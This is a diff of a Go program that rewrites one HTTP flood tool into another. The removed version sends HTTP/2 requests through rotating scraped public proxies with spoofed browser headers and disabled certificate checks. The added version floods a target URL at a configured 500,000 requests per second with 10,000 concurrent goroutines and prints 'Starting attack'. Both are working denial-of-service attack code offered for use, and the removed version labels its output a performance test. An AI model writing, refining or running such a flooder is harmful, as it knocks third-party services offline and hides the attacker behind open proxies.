@@ -1,289 +1,187 @@
 package main
-// 2
+
 import (
-	"crypto/tls"
+	"bufio"
 	"fmt"
-	"io/ioutil"
-	"math/rand"
-	"net"
 	"net/http"
 	"net/url"
 	"os"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
+)
 
-	"golang.org/x/net/http2"
+// Configuration
+const (
+	targetURL          = "http://example.com" // Replace with your target URL
+	durationSeconds    = 240
+	requestsPerSecond  = 500000
+	proxyFetchInterval = 5 * time.Minute // Fetch proxies periodically
 )
 
 var (
-	acceptList = []string{
-		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
-		"application/json, text/javascript, */*; q=0.01",
-		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-		"application/javascript, */*;q=0.8",
-		"application/x-www-form-urlencoded;q=0.9,image/webp,image/apng,*/*;q=0.8",
+	proxySources        = []string{
+		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+		"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
 	}
-
-	userAgentList = []string{
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.3945.88 Safari/537.36",
-		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.102 Safari/537.36",
-		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.66 Safari/537.36",
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
-		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:119.0) Gecko/20100101 Firefox/119.0",
-		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/537.36",
-		"Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.3945.79 Mobile Safari/537.36",
-	}
-
-	paths = []string{"/", "/home", "/login", "/dashboard", "/api/data", "/status"}
+	proxies             []string
+	mu                  sync.RWMutex
+	proxyFetcherRunning bool
+	fatalError          atomic.Bool // If set, stop all execution
 )
 
-type Stats struct {
-	sync.Mutex
-	totalRequests      int
-	successfulRequests int
-	failedRequests     int
-	rpsHistory         []int
+// Logs error and exits immediately
+func logFatalError(message string, err error) {
+	fmt.Fprintf(os.Stderr, "FATAL ERROR: %s: %v\n", message, err)
+	fatalError.Store(true)
 }
 
-type ClientPool struct {
-	sync.Mutex
-	clients map[string]*http.Client
-}
-
-func main() {
-	if len(os.Args) < 3 {
-		fmt.Println("TLSv1.3 (tls)\nUsage: go run main.go [url] [thread]")
-		os.Exit(1)
+// Fetch proxies from external sources
+func fetchProxies() {
+	if proxyFetcherRunning {
+		return
 	}
+	proxyFetcherRunning = true
+	defer func() {
+		proxyFetcherRunning = false
+	}()
 
-	target := os.Args[1]
-	threadCount := atoi(os.Args[2])
-	duration := 240 * time.Second
-
-	fmt.Println("Fetching proxy list...")
-	proxyList := fetchProxies()
-	if len(proxyList) == 0 {
-		fmt.Println("No proxies available")
-		os.Exit(1)
-	}
-	fmt.Printf("Loaded %d proxies\n", len(proxyList))
-
-	stats := &Stats{}
-	clientPool := &ClientPool{clients: make(map[string]*http.Client)}
-	stopTime := time.Now().Add(duration)
-	ratePerThread := 100000 / threadCount
-
+	newProxies := make(map[string]bool)
 	var wg sync.WaitGroup
-	go collectStats(stats, stopTime)
 
-	for i := 0; i < threadCount; i++ {
+	for _, sourceURL := range proxySources {
 		wg.Add(1)
-		go func() {
+		go func(urlStr string) {
 			defer wg.Done()
-			startAttack(target, proxyList, stopTime, ratePerThread, stats, clientPool)
-		}()
-	}
-
-	wg.Wait()
-	printResults(target, stats)
-}
-
-func (cp *ClientPool) GetClient(proxy string) (*http.Client, error) {
-	cp.Lock()
-	defer cp.Unlock()
-
-	if client, ok := cp.clients[proxy]; ok {
-		return client, nil
-	}
-
-	dialer := &net.Dialer{
-		Timeout:   5 * time.Second,
-		KeepAlive: 500 * time.Second,
-	}
-
-	transport := &http2.Transport{
-		TLSClientConfig: &tls.Config{
-			MinVersion:         tls.VersionTLS13,
-			MaxVersion:         tls.VersionTLS13,
-			CipherSuites:       []uint16{tls.TLS_AES_128_GCM_SHA256, tls.TLS_AES_256_GCM_SHA384},
-			CurvePreferences:   []tls.CurveID{tls.X25519},
-			InsecureSkipVerify: true,
-		},
-		DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
-			conn, err := dialer.Dial("tcp", proxy)
+			fmt.Printf("Fetching proxies from: %s\n", urlStr)
+			resp, err := http.Get(urlStr)
 			if err != nil {
-				return nil, err
+				logFatalError(fmt.Sprintf("Error fetching proxies from %s", urlStr), err)
+				return
 			}
-			return tls.Client(conn, cfg), nil
-		},
-		AllowHTTP: true,
-	}
+			defer resp.Body.Close()
 
-	client := &http.Client{
-		Transport: transport,
-		Timeout:   5 * time.Second,
+			if resp.StatusCode != http.StatusOK {
+				logFatalError(fmt.Sprintf("Failed to fetch proxies, status code: %d", resp.StatusCode), nil)
+				return
+			}
+
+			scanner := bufio.NewScanner(resp.Body)
+			for scanner.Scan() {
+				proxy := strings.TrimSpace(scanner.Text())
+				if proxy != "" {
+					newProxies[proxy] = true
+				}
+			}
+			if err := scanner.Err(); err != nil {
+				logFatalError(fmt.Sprintf("Error reading proxies from %s", urlStr), err)
+			}
+		}(sourceURL)
 	}
-	cp.clients[proxy] = client
-	return client, nil
+	wg.Wait()
+
+	// Save proxies
+	mu.Lock()
+	proxies = make([]string, 0, len(newProxies))
+	for p := range newProxies {
+		proxies = append(proxies, p)
+	}
+	mu.Unlock()
+
+	if len(proxies) == 0 {
+		logFatalError("No valid proxies fetched", nil)
+	}
+	fmt.Printf("Fetched %d proxies.\n", len(proxies))
 }
 
-func collectStats(stats *Stats, stopTime time.Time) {
-	ticker := time.NewTicker(time.Second)
-	defer ticker.Stop()
+// Send request using a proxy, logging errors and status codes
+func sendRequestWithProxy(urlStr string, proxyURLStr string, client *http.Client, wg *sync.WaitGroup, requestCounter *int64) {
+	defer wg.Done()
 
-	for time.Now().Before(stopTime) {
-		<-ticker.C
-		stats.Lock()
-		if len(stats.rpsHistory) > 0 {
-			lastRPS := stats.totalRequests - sum(stats.rpsHistory[:len(stats.rpsHistory)-1])
-			stats.rpsHistory = append(stats.rpsHistory, lastRPS)
-		} else {
-			stats.rpsHistory = append(stats.rpsHistory, stats.totalRequests)
-		}
-		stats.Unlock()
-	}
-}
-
-func startAttack(target string, proxyList []string, stopTime time.Time, rate int, stats *Stats, clientPool *ClientPool) {
-	ticker := time.NewTicker(time.Second / time.Duration(rate))
-	defer ticker.Stop()
-
-	parsedTarget, _ := url.Parse(target)
-	for time.Now().Before(stopTime) {
-		<-ticker.C
-		proxy := proxyList[rand.Intn(len(proxyList))]
-		go sendRequest(proxy, target, parsedTarget, stats, clientPool)
-	}
-}
-
-func sendRequest(proxy, target string, parsedTarget *url.URL, stats *Stats, clientPool *ClientPool) {
-	client, err := clientPool.GetClient(proxy)
+	proxyURL, err := url.Parse(proxyURLStr)
 	if err != nil {
-		stats.Lock()
-		stats.totalRequests++
-		stats.failedRequests++
-		stats.Unlock()
+		logFatalError(fmt.Sprintf("Invalid proxy URL: %s", proxyURLStr), err)
 		return
 	}
 
-	req, _ := http.NewRequest(
-		randMethod(),
-		fmt.Sprintf("%s%s", target, randPath()),
-		nil,
-	)
+	transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
+	client.Transport = transport
 
-	req.Header.Set("Accept", acceptList[rand.Intn(len(acceptList))])
-	req.Header.Set("User-Agent", userAgentList[rand.Intn(len(userAgentList))])
-	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
-	req.Header.Set("Accept-Language", "en-US,en;q=0.9,es-ES;q=0.8,es;q=0.7")
-	req.Header.Set("Referer", fmt.Sprintf("%s%s", target, randPath()))
-	req.Header.Set("Sec-Ch-Ua", fmt.Sprintf(`"Not_A Brand";v="%d", "Chromium";v="%d", "Google Chrome";v="%d"`,
-		randInt(121, 345), randInt(421, 6345), randInt(421, 7124356)))
-	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
-	req.Header.Set("Sec-Ch-Ua-Platform", randString([]string{"Windows", "MacOS"}))
-	req.Header.Set("Upgrade-Insecure-Requests", "1")
-
-	resp, err := client.Do(req)
-	stats.Lock()
-	stats.totalRequests++
-	if err != nil || resp == nil || resp.StatusCode != 200 {
-		stats.failedRequests++
-	} else {
-		stats.successfulRequests++
-		resp.Body.Close()
+	resp, err := client.Get(urlStr)
+	if err != nil {
+		logFatalError(fmt.Sprintf("Request failed using proxy %s", proxyURLStr), err)
+		return
 	}
-	stats.Unlock()
+	defer resp.Body.Close()
+
+	fmt.Printf("Response from %s via proxy %s: %d\n", urlStr, proxyURLStr, resp.StatusCode)
+
+	if resp.StatusCode != http.StatusOK {
+		logFatalError(fmt.Sprintf("Received non-OK status %d", resp.StatusCode), nil)
+	}
+
+	atomic.AddInt64(requestCounter, 1)
 }
 
-func fetchProxies() []string {
-	proxySources := []string{
-		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-		"https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
-		"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
-		"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
-	}
+func main() {
+	duration := time.Duration(durationSeconds) * time.Second
+	totalRequests := int64(requestsPerSecond * durationSeconds)
 
-	var proxies []string
-	client := &http.Client{Timeout: 10 * time.Second}
-
-	for _, source := range proxySources {
-		resp, err := client.Get(source)
-		if err != nil {
-			fmt.Printf("Failed to fetch from %s: %v\n", source, err)
-			continue
+	// Fetch proxies before starting
+	fetchProxies()
+	go func() {
+		ticker := time.NewTicker(proxyFetchInterval)
+		defer ticker.Stop()
+		for range ticker.C {
+			fetchProxies()
 		}
-		defer resp.Body.Close()
+	}()
 
-		body, err := ioutil.ReadAll(resp.Body)
-		if err != nil {
-			continue
+	startTime := time.Now()
+	endTime := startTime.Add(duration)
+	var requestsSent int64
+	var wg sync.WaitGroup
+
+	fmt.Printf("Starting attack: %d requests to %s over %s...\n", totalRequests, targetURL, duration)
+
+	concurrency := 10000
+
+	for time.Now().Before(endTime) && atomic.LoadInt64(&requestsSent) < totalRequests {
+		if fatalError.Load() {
+			fmt.Println("Stopping execution due to fatal error.")
+			break
 		}
 
-		proxyList := strings.Split(string(body), "\n")
-		for _, proxy := range proxyList {
-			proxy = strings.TrimSpace(proxy)
-			if proxy != "" && strings.Contains(proxy, ":") {
-				proxies = append(proxies, proxy)
+		mu.RLock()
+		numProxies := len(proxies)
+		mu.RUnlock()
+
+		if numProxies > 0 {
+			for i := 0; i < concurrency && atomic.LoadInt64(&requestsSent) < totalRequests; i++ {
+				mu.RLock()
+				proxyIndex := atomic.LoadInt64(&requestsSent) % int64(numProxies)
+				proxyURL := proxies[proxyIndex]
+				mu.RUnlock()
+
+				client := &http.Client{Timeout: 10 * time.Second}
+
+				wg.Add(1)
+				go sendRequestWithProxy(targetURL, proxyURL, client, &wg, &requestsSent)
 			}
+			time.Sleep(1 * time.Millisecond)
+		} else {
+			logFatalError("No proxies available. Stopping execution.", nil)
 		}
 	}
 
-	return proxies
-}
+	fmt.Println("Waiting for all requests to complete...")
+	wg.Wait()
 
-func printResults(url string, stats *Stats) {
-	stats.Lock()
-	defer stats.Unlock()
+	elapsedTime := time.Since(startTime)
+	actualRPS := float64(atomic.LoadInt64(&requestsSent)) / elapsedTime.Seconds()
 
-	peakRPS := 0
-	for _, rps := range stats.rpsHistory {
-		if rps > peakRPS {
-			peakRPS = rps
-		}
-	}
-
-	averageRPS := float64(stats.totalRequests) / 240
-
-	fmt.Printf("\nHTTP/2 Performance Test Results (240s duration):\n")
-	fmt.Printf("Target URL: %s\n", url)
-	fmt.Printf("Total Requests: %d\n", stats.totalRequests)
-	fmt.Printf("Successful Requests (200 only): %d\n", stats.successfulRequests)
-	fmt.Printf("Failed Requests: %d\n", stats.failedRequests)
-	fmt.Printf("Peak RPS: %d\n", peakRPS)
-	fmt.Printf("Average RPS: %.2f\n", averageRPS)
-	fmt.Printf("Success Rate: %.2f%%\n", float64(stats.successfulRequests)/float64(stats.totalRequests)*100)
-}
-
-func randInt(min, max int) int {
-	return min + rand.Intn(max-min+1)
-}
-
-func randMethod() string {
-	if rand.Float32() < 0.5 {
-		return "GET"
-	}
-	return "POST"
-}
-
-func randPath() string {
-	return paths[rand.Intn(len(paths))]
-}
-
-func randString(options []string) string {
-	return options[rand.Intn(len(options))]
-}
-
-func atoi(s string) int {
-	var result int
-	fmt.Sscanf(s, "%d", &result)
-	return result
-}
-
-func sum(slice []int) int {
-	total := 0
-	for _, v := range slice {
-		total += v
-	}
-	return total
+	fmt.Printf("\nAttack finished in %s\n", elapsedTime)
+	fmt.Printf("Total requests sent: %d\n", atomic.LoadInt64(&requestsSent))
+	fmt.Printf("Achieved RPS: %.2f\n", actualRPS)
 }
